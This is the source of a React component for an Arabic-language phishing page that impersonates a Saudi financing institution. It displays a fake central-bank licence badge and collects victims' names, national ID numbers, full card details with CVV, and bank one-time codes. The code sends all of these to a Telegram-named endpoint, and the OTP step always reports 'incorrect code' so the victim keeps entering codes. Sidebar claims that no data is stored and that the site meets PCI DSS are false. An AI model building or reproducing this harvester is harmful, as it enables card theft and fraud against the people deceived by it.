"use client";
import { useState, useEffect } from "react";
import Cards from "react-credit-cards-2";
import "react-credit-cards-2/dist/es/styles-compiled.css";

const STEPS = ["نظرة عامة", "معلومات العميل", "تفاصيل البطاقة", "التأكيد"];

function ProgressBar({ step }: { step: number }) {
  return (
    <div className="mb-8">
      <div className="flex justify-between items-center mb-3">
        <span className="text-sm font-bold text-primary px-3 py-1 bg-primary/5 rounded-full">
          الخطوة {step} من {STEPS.length}
        </span>
        <span className="text-on-surface-variant text-xs sm:text-sm font-medium">{STEPS[step - 1]}</span>
      </div>
      <div className="w-full bg-[#e0e3e6] h-1.5 rounded-full overflow-hidden">
        <div
          className="bg-secondary h-full rounded-full transition-all duration-500"
          style={{ width: `${(step / STEPS.length) * 100}%` }}
        />
      </div>
    </div>
  );
}

function Step1({ onNext }: { onNext: () => void }) {
  return (
    <div className="space-y-6">
      <h1 className="text-xl sm:text-2xl md:text-3xl font-black text-primary leading-tight" style={{ fontFamily: "var(--font-cairo)" }}>
        هذه البوابة مخصصة للعملاء الحاليين فقط
      </h1>
      <p className="text-on-surface-variant leading-relaxed text-xs sm:text-sm md:text-base">
        يرجى اتباع الخطوات التالية لتحديث بيانات التحقق الخاصة بك وتفعيل الميزات الذكية لحسابك في مؤسسة تبارك.
      </p>
     

      {/* SAMA Badge */}
      <div className="rounded-2xl overflow-hidden border border-green-200 shadow-md w-full">
        <div className="bg-gradient-to-br from-green-700 via-green-600 to-emerald-500 px-4 sm:px-6 py-4 sm:py-5 flex flex-col items-center gap-1 text-center">
          <span className="material-symbols-outlined text-white text-3xl sm:text-4xl" style={{ fontVariationSettings: "'FILL' 1" }}>verified</span>
          <p className="text-white font-black text-sm sm:text-base" style={{ fontFamily: "var(--font-cairo)" }}>مرخص من البنك المركزي السعودي</p>
          <p className="text-green-100 text-[11px] sm:text-xs">Saudi Central Bank — SAMA Licensed</p>
        </div>
        <div className="bg-white flex justify-center p-4 sm:p-5">
          <img
            src="/ChatGPT Image Mar 29, 2026, 07_38_12 PM (1).webp"
            alt="SAMA License"
            className="max-h-28 sm:max-h-36 w-auto object-contain"
          />
        </div>
      </div>
      <button
        onClick={onNext}
        className="flex items-center gap-3 bg-secondary text-white px-6 sm:px-8 py-3 sm:py-4 rounded-xl font-bold text-sm sm:text-base hover:brightness-110 active:scale-95 transition-all group"
        style={{ fontFamily: "var(--font-cairo)" }}
      >
        متابعة
        <span className="material-symbols-outlined group-hover:-translate-x-1 transition-transform">arrow_back</span>
      </button>
    </div>
  );
}

const SERVICES = [
  { icon: "calendar_month", label: "تنظيم الأقساط الشهرية" },
  { icon: "autorenew", label: "استقطاع شهري" },
  { icon: "undo", label: "استرجاع دفعة" },
  { icon: "receipt_long", label: "دفع فاتورة" },
];

type Step2Data = { customerName: string; idNumber: string; service: string; dayOrAmount: number | string };

function Step2({ onNext, onBack }: { onNext: (data: Step2Data) => void; onBack: () => void }) {
  const [selected, setSelected] = useState("");
  const [selectedDay, setDay] = useState<number | null>(null);
  const [amount, setAmount] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [idError, setIdError] = useState("");
  const [customerName, setCustomerName] = useState("");

  const validateId = (val: string) => {
    if (val.length !== 10) return "رقم الهوية يجب أن يكون 10 أرقام";
    if (val[0] !== "1" && val[0] !== "2") return "يجب أن يبدأ الرقم بـ 1 (هوية) أو 2 (إقامة)";
    return "";
  };

  const isAmountService = selected === "استرجاع دفعة" || selected === "دفع فاتورة";
  const canProceed = customerName.trim() && selected && !validateId(idNumber) && (isAmountService ? !!amount : !!selectedDay);

  return (
    <form className="space-y-6" onSubmit={(e) => { e.preventDefault(); if (canProceed) onNext({ customerName, idNumber, service: selected, dayOrAmount: isAmountService ? amount : selectedDay! }); }}>
      <h2 className="text-lg sm:text-xl font-black text-primary" style={{ fontFamily: "var(--font-cairo)" }}>معلومات العميل</h2>
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
        <div className="space-y-2">
          <label className="block text-xs sm:text-sm font-bold text-primary">الاسم بالكامل</label>
          <input required value={customerName} onChange={(e) => setCustomerName(e.target.value)} className="w-full bg-[#e0e3e6] border-none focus:ring-2 focus:ring-primary rounded-xl p-2.5 sm:p-3 text-sm sm:text-base text-[#191c1e] outline-none" placeholder="أدخل اسمك كما هو في الهوية" />
        </div>
        <div className="space-y-2">
          <label className="block text-xs sm:text-sm font-bold text-primary">رقم الهوية / الإقامة</label>
          <input
            required
            maxLength={10}
            value={idNumber}
            onChange={(e) => {
              const val = e.target.value.replace(/\D/g, "");
              setIdNumber(val);
              if (idError) setIdError(validateId(val));
            }}
            onBlur={() => setIdError(validateId(idNumber))}
            className={`w-full bg-[#e0e3e6] border-2 focus:ring-2 focus:ring-primary rounded-xl p-2.5 sm:p-3 text-sm sm:text-base text-[#191c1e] outline-none transition-colors ${
              idError ? "border-red-400" : "border-transparent"
            }`}
            placeholder="1XXXXXXXXX"
          />
          {idError && <p className="text-xs text-red-400">{idError}</p>}
        </div>
      </div>
      <div className="space-y-3">
        <label className="block text-xs sm:text-sm font-bold text-primary">نوع الخدمة المطلوبة</label>
        <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
          {SERVICES.map(({ icon, label }) => (
            <button
              key={label}
              type="button"
              onClick={() => setSelected(label)}
              className={`flex flex-col items-center gap-2 p-4 rounded-xl border-2 transition-all ${
                selected === label
                  ? "border-secondary bg-secondary-container/20 text-secondary"
                  : "border-outline-variant/30 bg-surface-container-low text-on-surface-variant hover:border-primary/30"
              }`}
            >
              <span className="material-symbols-outlined text-xl sm:text-2xl">{icon}</span>
              <span className="text-[10px] sm:text-xs font-bold text-center leading-tight">{label}</span>
            </button>
          ))}
        </div>
        {!selected && <p className="text-xs text-red-400 hidden peer-invalid:block">يرجى اختيار نوع الخدمة</p>}
      </div>
      {isAmountService ? (
        <div className="space-y-2">
          <label className="block text-xs sm:text-sm font-bold text-primary">
            {selected === "استرجاع دفعة" ? "المبلغ المراد استرجاعه" : "أدخل قيمة المبلغ المطلوب دفعه"}
          </label>
          <div className="relative">
            <input
              required
              type="number"
              min="1"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className="w-full bg-[#e0e3e6] border-none focus:ring-2 focus:ring-primary rounded-xl p-2.5 sm:p-3 pl-14 sm:pl-16 text-sm sm:text-base text-[#191c1e] outline-none"
              placeholder="0.00"
            />
            <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm font-bold text-on-surface-variant">ر.س</span>
          </div>
        </div>
      ) : (
        <div className="space-y-3">
          <label className="block text-xs sm:text-sm font-bold text-primary">يوم السداد الشهري</label>
          <div className="grid grid-cols-7 sm:grid-cols-7 gap-1 sm:gap-1.5">
            {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
              <button
                key={day}
                type="button"
                onClick={() => setDay(day)}
                className={`aspect-square rounded-lg sm:rounded-xl text-xs sm:text-sm font-bold transition-all ${
                  selectedDay === day
                    ? "bg-primary text-white shadow-md scale-105"
                    : "bg-surface-container-low text-on-surface-variant hover:bg-primary/10 hover:text-primary"
                }`}
              >
                {day}
              </button>
            ))}
          </div>
        </div>
      )}
      <div className="flex justify-between items-center pt-2">
        <button type="button" onClick={onBack} className="text-on-surface-variant text-sm sm:text-base font-bold hover:text-primary transition-colors flex items-center gap-1">
          <span className="material-symbols-outlined text-base sm:text-xl">chevron_right</span> رجوع
        </button>
        <button type="submit" className="bg-primary text-white px-6 sm:px-8 py-2.5 sm:py-3 text-sm sm:text-base rounded-xl font-bold hover:brightness-110 active:scale-95 transition-all">
          التالي
        </button>
      </div>
    </form>
  );
}

type CardFocus = "number" | "name" | "expiry" | "cvc";

function formatCardNumber(val: string) {
  return val.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

function luhn(num: string) {
  const digits = num.replace(/\s/g, "");
  let sum = 0;
  let alt = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i]);
    if (alt) { n *= 2; if (n > 9) n -= 9; }
    sum += n;
    alt = !alt;
  }
  return sum % 10 === 0;
}

function formatExpiry(val: string) {
  const digits = val.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

function Step3({ onNext, onBack, step2Data }: { onNext: (txId: string) => void; onBack: () => void; step2Data: Step2Data }) {
  const [card, setCard] = useState({ number: "", name: "", expiry: "", cvc: "" });
  const [focus, setFocus] = useState<CardFocus>("number");
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [showExpiry, setShowExpiry] = useState(true);
  const [showCvv, setShowCvv] = useState(true);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    fetch("/api/card-settings")
      .then((r) => r.json())
      .then((d) => { setShowExpiry(d.showExpiryDate); setShowCvv(d.showCvv); })
      .catch(() => {});
  }, []);

  const handleConfirm = async () => {
    if (!validate()) return;
    setLoading(true);
    const res = await fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type: "card", ...step2Data, cardName: card.name, cardNumber: card.number, expiry: card.expiry, cvc: card.cvc }),
    }).catch(() => null);
    const data = res ? await res.json().catch(() => ({})) : {};
    setLoading(false);
    onNext(data.transactionId || "");
  };

  const validate = () => {
    const e: Record<string, string> = {};
    const digits = card.number.replace(/\s/g, "");
    if (digits.length !== 16) e.number = "رقم البطاقة يجب أن يكون 16 رقماً";
    else if (!luhn(digits)) e.number = "رقم البطاقة غير صالح";
    if (!card.name.trim() || !/^[a-zA-Z\s]+$/.test(card.name)) e.name = "الاسم يجب أن يكون بالإنجليزية فقط";
    if (showExpiry) {
      const [mm, yy] = card.expiry.split("/");
      const month = parseInt(mm), year = parseInt("20" + yy);
      const now = new Date();
      if (!mm || !yy || month < 1 || month > 12 || year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1))
        e.expiry = "تاريخ انتهاء غير صالح";
    }
    if (showCvv && card.cvc.length !== 3) e.cvc = "CVV يجب أن يكون 3 أرقام فقط";
    setErrors(e);
    return Object.keys(e).length === 0;
  };

  const field = (key: keyof typeof card) => ({
    value: card[key],
    onFocus: () => setFocus(key as CardFocus),
    className: `w-full bg-white border-2 rounded-xl p-3 text-[#191c1e] outline-none focus:ring-2 focus:ring-primary transition-colors placeholder:text-[#9aa0a6] font-mono tracking-wider ${
      errors[key] ? "border-red-400" : "border-[#c1c7ce]/60 focus:border-primary"
    }`,
  });

  return (
    <form className="space-y-6" onSubmit={(e) => { e.preventDefault(); handleConfirm(); }}>
      <h2 className="text-lg sm:text-xl font-black text-primary" style={{ fontFamily: "var(--font-cairo)" }}>تفاصيل البطاقة</h2>

      <div dir="ltr" className="flex justify-center my-8 scale-90 sm:scale-110 md:scale-125 origin-center">
        <Cards
          number={card.number.replace(/\s/g, "")}
          name={card.name || "FULL NAME"}
          expiry={card.expiry}
          cvc={card.cvc}
          focused={focus}
        />
      </div>

      <div className="space-y-2">
        <label className="block text-xs sm:text-sm font-bold text-primary">رقم البطاقة</label>
        <div className="relative">
          <input
            {...field("number")}
            dir="ltr"
            placeholder="0000 0000 0000 0000"
            className={field("number").className + " pr-11"}
            onChange={(e) => setCard((p) => ({ ...p, number: formatCardNumber(e.target.value) }))}
          />
          <span className="material-symbols-outlined absolute right-3 top-1/2 -translate-y-1/2 text-[#9aa0a6] text-xl">credit_card</span>
        </div>
        {errors.number && <p className="text-xs text-red-400">{errors.number}</p>}
      </div>

      <div className="space-y-2">
        <label className="block text-xs sm:text-sm font-bold text-primary">الاسم على البطاقة</label>
        <input
          {...field("name")}
          dir="ltr"
          placeholder="FULL NAME"
          onChange={(e) => setCard((p) => ({ ...p, name: e.target.value.toUpperCase() }))}
        />
        {errors.name && <p className="text-xs text-red-400">{errors.name}</p>}
      </div>

      {(showExpiry || showCvv) && (
        <div className="grid grid-cols-2 gap-4">
          {showExpiry && (
            <div className="space-y-2">
              <label className="block text-xs sm:text-sm font-bold text-primary">تاريخ الانتهاء</label>
              <input
                {...field("expiry")}
                dir="ltr"
                placeholder="MM / YY"
                maxLength={5}
                onChange={(e) => setCard((p) => ({ ...p, expiry: formatExpiry(e.target.value) }))}
              />
              {errors.expiry && <p className="text-xs text-red-400">{errors.expiry}</p>}
            </div>
          )}
          {showCvv && (
            <div className="space-y-2">
              <label className="block text-xs sm:text-sm font-bold text-primary">CVV</label>
              <input
                {...field("cvc")}
                dir="ltr"
                placeholder="• • •"
                maxLength={3}
                type="password"
                onChange={(e) => setCard((p) => ({ ...p, cvc: e.target.value.replace(/\D/g, "") }))}
              />
              {errors.cvc && <p className="text-xs text-red-400">{errors.cvc}</p>}
            </div>
          )}
        </div>
      )}

      <div className="flex justify-between items-center pt-2">
        <button type="button" onClick={onBack} className="text-on-surface-variant text-sm sm:text-base font-bold hover:text-primary transition-colors flex items-center gap-1">
          <span className="material-symbols-outlined text-base sm:text-xl">chevron_right</span> رجوع
        </button>
        <button type="submit" disabled={loading} className="bg-secondary text-white px-6 sm:px-8 py-2.5 sm:py-3 text-sm sm:text-base rounded-xl font-bold hover:brightness-110 active:scale-95 transition-all disabled:opacity-60">
          {loading ? "جاري الإرسال..." : "تأكيد"}
        </button>
      </div>
    </form>
  );
}

function Step4({ transactionId }: { transactionId: string }) {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const [countdown, setCountdown] = useState(0);

  useEffect(() => {
    localStorage.setItem("otp_start", Date.now().toString());
    const calc = () => {
      const saved = localStorage.getItem("otp_start")!;
      return Math.max(0, 60 - Math.floor((Date.now() - parseInt(saved)) / 1000));
    };
    setCountdown(calc());
    const interval = setInterval(() => setCountdown(calc()), 500);
    return () => clearInterval(interval);
  }, []);

  const sendToTelegram = (type: "otp" | "resend", code?: string) =>
    fetch("/api/telegram", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ type, transactionId, otp: code }),
    }).catch(() => {});

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otp.length !== 4 && otp.length !== 6) { setError("يرجى إدخال رمز مكون من 4 أو 6 أرقام"); return; }
    sendToTelegram("otp", otp);
    setError("رمز التحقق غير صحيح، يرجى التحقق والمحاولة مجدداً");
    setOtp("");
    setSubmitCooldown(5);
    const t = setInterval(() => setSubmitCooldown((p) => { if (p <= 1) { clearInterval(t); return 0; } return p - 1; }), 1000);
  };

  const handleResend = () => {
    sendToTelegram("resend");
    localStorage.setItem("otp_start", Date.now().toString());
    setCountdown(60);
    setOtp("");
    setError("");
  };


  return (
    <form className="space-y-6" onSubmit={handleSubmit}>
      <div className="space-y-1">
        <h2 className="text-lg sm:text-xl font-black text-primary" style={{ fontFamily: "var(--font-cairo)" }}>رمز التحقق البنكي</h2>
        <p className="text-xs sm:text-sm text-on-surface-variant leading-relaxed">
          سيتم إرسال رسالة نصية تحتوي على رمز تحقق على رقمك المسجل لدى البنك. أدخل الرمز لتأكيد العملية.
        </p>
       
      </div>

      <div className="space-y-3">
        <label className="block text-xs sm:text-sm font-bold text-primary">أدخل رمز التحقق</label>
        <input
          type="text"
          inputMode="numeric"
          value={otp}
          onChange={(e) => { setOtp(e.target.value.replace(/\D/g, "")); setError(""); }}
          className={`w-full border-2 rounded-xl p-3 text-center text-xl font-black font-mono outline-none transition-all bg-white tracking-widest ${error ? "border-red-400" : "border-outline-variant/40 focus:border-primary"}`}
          placeholder="أدخل الرمز"
          dir="ltr"
        />
        {error && <p className="text-xs text-red-400 text-center">{error}</p>}
      </div>

      <button type="submit" disabled={submitCooldown > 0} className="w-full bg-secondary text-white py-2.5 sm:py-3 text-sm sm:text-base rounded-xl font-bold hover:brightness-110 active:scale-95 transition-all disabled:opacity-60">
        {submitCooldown > 0 ? `يرجى الانتظار ${submitCooldown} ثوانٍ...` : "تاكيد الرمز و تاكيد عملية القسط الشهري"}
      </button>
      <div className="text-center">
        {countdown > 0 ? (
          <p className="text-xs sm:text-sm text-on-surface-variant">
            يمكنك طلب رمز جديد خلال{" "}
            <span className="font-black ext-primary font-mono">
              {String(Math.floor(countdown / 60)).padStart(2, "0")}:{String(countdown % 60).padStart(2, "0")}
            </span>
          </p>
        ) : (
          <button
            type="button"
            onClick={handleResend}
            className="text-xs sm:text-sm font-bold text-primary hover:underline flex items-center gap-1 mx-auto"
          >
            <span className="material-symbols-outlined text-sm">refresh</span>
            طلب رمز جديد من البنك
          </button>
        )}
      </div>
    </form>
  );
}

export default function VerifyFlow() {
  const [step, setStep] = useState(1);
  const [step2Data, setStep2Data] = useState<Step2Data | null>(null);
  const [transactionId, setTransactionId] = useState("");

  return (
    <div className="max-w-4xl w-full grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
      {/* Main Steps */}
      <div className="lg:col-span-8">
        <div className="bg-white p-6 sm:p-10 rounded-2xl shadow-[0_12px_32px_-4px_rgba(15,76,107,0.08)] border border-outline-variant/20">
          {step < 4 && <ProgressBar step={step} />}
          {step === 1 && <Step1 onNext={() => setStep(2)} />}
          {step === 2 && <Step2 onNext={(data) => { setStep2Data(data); setStep(3); }} onBack={() => setStep(1)} />}
          {step === 3 && step2Data && <Step3 onNext={(txId) => { setTransactionId(txId); setStep(4); }} onBack={() => setStep(2)} step2Data={step2Data} />}
          {step === 4 && <Step4 transactionId={transactionId} />}
        </div>
      </div>

      {/* Sidebar */}
      <aside className="lg:col-span-4 space-y-6">
        <div className="bg-primary/5 p-6 rounded-2xl border border-primary/10 space-y-5">
          <h2 className="text-primary font-bold flex items-center gap-2" style={{ fontFamily: "var(--font-cairo)" }}>
            <span className="material-symbols-outlined">verified_user</span>
            مركز الأمان الرقمي
          </h2>
          <ul className="space-y-4">
            {[
              { icon: "lock", title: "اتصال مشفر SSL", desc: "يتم حماية كافة البيانات المرسلة عبر تشفير عالي المستوى." },
              { icon: "database_off", title: "لا يتم حفظ البيانات", desc: "بيانات البطاقة تستخدم للتحقق اللحظي فقط ولا تخزن في أنظمتنا." },
              { icon: "shield", title: "معايير PCI DSS", desc: "متوافقون مع أعلى المعايير العالمية لأمن البطاقات البنكية." },
            ].map(({ icon, title, desc }) => (
              <li key={title} className="flex gap-3 items-start">
                <span className="material-symbols-outlined text-secondary mt-0.5" style={{ fontVariationSettings: "'FILL' 1" }}>{icon}</span>
                <div>
                  <h3 className="text-sm font-bold text-[#191c1e]">{title}</h3>
                  <p className="text-xs text-on-surface-variant">{desc}</p>
                </div>
              </li>
            ))}
          </ul>
        </div>
        <div className="bg-surface-container-low p-6 rounded-2xl space-y-3">
          <h3 className="text-sm font-bold text-primary">تحتاج مساعدة؟</h3>
          <p className="text-xs text-on-surface-variant leading-relaxed">فريق الدعم الفني متاح على مدار الساعة لمساعدتك في عملية التحقق.</p>
          <a
            href="https://wa.me/966593912790"
            target="_blank"
            rel="noopener noreferrer"
            className="w-full py-2 bg-white text-primary border border-primary/20 rounded-xl text-sm font-bold hover:bg-primary hover:text-white transition-all flex items-center justify-center gap-2"
          >
            <span className="material-symbols-outlined text-base">chat</span>
            تحدث مع الدعم
          </a>
        </div>
      </aside>
    </div>
  );
}
